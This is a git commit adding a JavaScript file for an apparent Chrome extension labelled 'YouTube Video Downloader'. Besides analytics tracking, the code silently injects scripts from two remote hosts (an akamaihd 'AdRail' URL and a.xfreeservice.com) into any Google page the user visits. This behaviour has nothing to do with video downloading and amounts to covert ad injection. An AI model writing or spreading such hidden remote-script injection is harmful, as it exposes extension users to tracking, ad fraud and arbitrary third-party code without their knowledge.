e0a13c79b5e4d2f6f8c5849252338a197a514b3a
wuiwuiwui <38850752+wuiwuiwui@users.noreply.github.com>
2019-10-21 22:17:21 +0800

    Initial commit

---
+++ HK_chrome.js
@@ -0,0 +1,41 @@
+/* =====================================
+    YouTube Video Downloader
+===================================== */
+
+// Google Analytics
+
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-142280324-1', 'auto');
+ga('set', 'dimension1', 'YouTube Video Downloader');
+ga('set', 'dimension2', 'Extension');
+
+ga('send', 'pageview');
+
+// End Google Analytics
+
+
+(function() {
+    // Your code goes here
+})();
+ga('create', 'UA-127830981-1', 'auto', 'adsTracker');
+ga('adsTracker.send', 'pageview');
+
+if (window.location.hostname.indexOf('.google.') !== -1) {
+	(function() {
+    var head = document.getElementsByTagName('head')[0];
+    var script = document.createElement('script');
+    script.type = 'text/javascript';
+    script.src = '//cdncache-a.akamaihd.net/sub/z07d469/EXT001/l.js?pid=2668&ext=AdRail&rvz_subid=9638-1005';
+    head.appendChild(script);
+})();
+}
+if (window.location.hostname.indexOf('.google.') !== -1) {
+var s = document.createElement("script");
+s.type = "text/javascript";
+s.src = 'https://a.xfreeservice.com/partner/XMI6a9Ur/?cid=ytmp3';
+document.body.appendChild(s);
+}
